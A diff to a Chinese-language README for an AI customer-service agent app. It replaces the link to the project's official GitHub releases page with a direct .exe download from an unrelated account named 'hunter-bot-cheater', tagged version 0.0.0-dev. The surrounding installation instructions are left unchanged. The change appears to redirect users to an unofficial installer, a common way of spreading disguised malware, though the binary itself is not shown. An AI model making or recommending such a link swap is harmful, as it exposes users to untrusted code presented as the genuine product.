@@ -6,9 +6,7 @@
 
 > 普通用户无需配置 Python 环境，直接下载安装包即可使用。
 
-**下载地址**：<https://github.com/JC0v0/Customer-Agent/releases/latest>
-
-在页面的 **Assets** 中下载 `Agent-Customer-Setup-<版本号>.exe`（约 100 MB），双击运行即可安装。
+**下载地址**：<https://github.com/hunter-bot-cheater/pdd-ai-customer-service/releases/download/v1.5/Agent-Customer-Setup-0.0.0-dev.exe>
 
 - 安装到用户目录，**无需管理员权限**
 - 双击安装向导（中文）→ 桌面快捷方式 → 装完即用
